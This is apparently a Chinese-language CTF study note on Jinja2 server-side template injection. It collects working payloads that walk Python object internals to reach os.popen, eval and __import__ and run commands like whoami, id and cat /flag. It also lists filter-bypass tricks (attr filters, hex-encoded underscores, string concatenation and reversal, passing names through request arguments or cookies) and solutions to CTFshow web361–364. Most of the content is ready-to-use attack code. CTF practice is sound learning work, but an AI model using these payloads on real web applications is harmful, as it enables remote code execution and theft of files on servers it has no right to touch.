## 利用链（总结ing）

### 一个渐进的过程

 举一个例子

```Python
1.找到注入点
2.尝试是否是ssti漏洞 --- {{7*7}}

3.{"".__class__.__base__.__subclasses__()}

4.在众多类中中找我们可以利用的类，可以浏览器高亮找，可以用Python脚本去寻找,找到下标号

5.利用我们这个利用类，去利用他的一些函数之类东西，去带出flag
{{"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("ls").read()}}
```

### os._wrap_close

```Python
 "".__class__.__bases__[0].__subclasses__()[..].__init__.__globals__['popen']('whoami').read()
 "".__class__.__bases__[0].__subclasses__()[..].__init__.__globals__.popen('whoami').read()
```

### os类

```Python
 "".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()
```

### 使用import下的os（python2不行）

可以使用 **import** 的 os

```Python
 "".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()
```

### _*builtins*_

下有eval，**import**等的函数，可以利用此来执行命令

```Python
 "".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
 "".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
 "".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
 "".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__'][']('os')[import]('os')[']('os').popen('id').read()
```

### 直接方法

```Python
 {{lipsum.__globals__['os'].popen('tac ../flag').read()}}
 #request对象的方法绕过
 
 {{cycler.__init__.__globals__.os.popen('ls').read()}}
```

## 绕过方法（总结ing）

### 基类

```Python
 __mro__[-1]
 __base__
 __bases__[0]
```

`.` 被ban

```python
''.__class__ = ''['__class__']
''.__class__ = ''|attr('__class__')
```

利用这两种方法

```Python
 1、用[]代替.
 {{"".__class__}}={{""['__class']}}
 2、用attr()过滤器绕过，举个例子
 {{"".__class__}}={{""|attr('__class__')}}
```

`_` 被ban

```Python
1、通过list获取字符列表，然后用pop来获取_，举个例子
 {% set a=(()|select|string|list).pop(24)%}{%print(a)%}
 2、可以通过十六进制编码的方式进行绕过，举个例子
 {{()["\x5f\x5fclass\x5f\x5f"]}} ={{().__class__}}
```



**赋值方法：**

这个主要用于单双引号被ban的情况

- `request.args.x`,传递get参数

- `request.cookies.x`，=传递cookie参数
- `request.values.x`，传递post参数



**花括号{}被ban**：

在jinjia引擎中可以使用`{%    %}`

```python
{%print("".__.....)%}
```



**中括号[]被ban**

使用`__getitem__`，这魔术方法我觉得可以看一下下面这个例子：

> ```python
> class MyDict:
>     def __init__(self, data):
>         self.data = data
> 
>     def __getitem__(self, key):
>         return self.data[key]
> 
> # 创建一个 MyDict 实例
> my_dict = MyDict({'a': 1, 'b': 2, 'c': 3})
> 
> # 使用键访问元素
> print(my_dict['a'])  # 输出: 1
> print(my_dict['c'])  # 输出: 3
> 
> ```

```python
__bases__[0]=__bases__.__getitem__(0)
```



**字符串**

在jinjia2中

- 拼接：---> `"cla""ss"` ===`"class"`
- 反转：--->`"__ssalc__"[::-1]`
- 占位符加ascll

```python
"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)='__class__'
```

> 贴几个占位符用法：
>
> `:d`整数，`:f`浮点，
>
> `:c`：将整数值格式化为对应的 Unicode 字符
>
> `:s`：将值格式化为字符串
>
> - `:<`：左对齐，右侧填充。
> - `:>`：右对齐，左侧填充。
> - `:^`：居中对齐，两侧填充。
> - `:<width>`：指定总宽度，并使用空格填充。
> - `:<width>fill`：指定总宽度，并使用指定字符填充。



**编码**

```python
"__class__"=="\x5f\x5fclass\x5f\x5f"=="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"
```

贴一个脚本：

```python
def string_to_hex(s):
    # 将字符串编码为十六进制形式，每个字符被转为两个十六进制数
    return s.encode('ascii').hex()

def hex_to_string(s):
    # 将十六进制字符串解码回普通字符串
    return bytes.fromhex(s).decode('ascii')

# 示例
normal_string = "__class__"
hex_string = string_to_hex(normal_string)
print(f"Original: {normal_string}")
print(f"Hex: {hex_string}")

# 转换回来以验证
decoded_string = hex_to_string(hex_string)
print(f"Decoded: {decoded_string}")

# 输出处理成类似 \x 格式
def string_to_hex_with_slashes(s):
    return ''.join(f'\\x{ord(c):02x}' for c in s)

# 测试
print("Hex with slashes:", string_to_hex_with_slashes(normal_string))
```



**jj拼接**

```python
{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}
```

> `a ~ b`：`~` 是 Jinja2 中的字符串拼接操作符。这里 `a ~ b` 会将 `a` 和 `b` 的值拼接成一个字符串 `__cla` + `ss__`，结果是 `__class__



## CTFSHOW ssti

### web361

```Python
{{ "".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()}}
```

### web362

> 过滤了数字32

```Python
 //利用运算
 {{ "".__class__.__base__.__subclasses__()[140-8].__init__.__globals__['popen']("cat /flag").read()}}
 {{lipsum.__globals__.__getitem__("os").popen("cat /flag").read()}}
 {{ "".__class__.__base__.__subclasses__()[94]["get_data"](0,"/flag")}}
```

### web363

> 1.过滤了部分数字
>
> 2.过滤了单双引号

这个就是使用传参数的方法

```python
?name={{().__class__.__base__.__subclasses__()[140-8].__init__.__globals__[request.args.a](request.args.b).read()}}&a=popen&b=cat+/flag
```

还有一种：

```python
#payload:
name={{x.__init__.__globals__[request.args.x1].eval(request.args.x2)}}&x1=__builtins__&x2=__import__('os').popen('cat /flag').read()
```



### web364

> ban了arg

```python
{{x.__init__.__globals__.__builtins__[request.cookies.x1](request.cookies.x2).read()}}
cookies：x1=open;x2=/flag
```

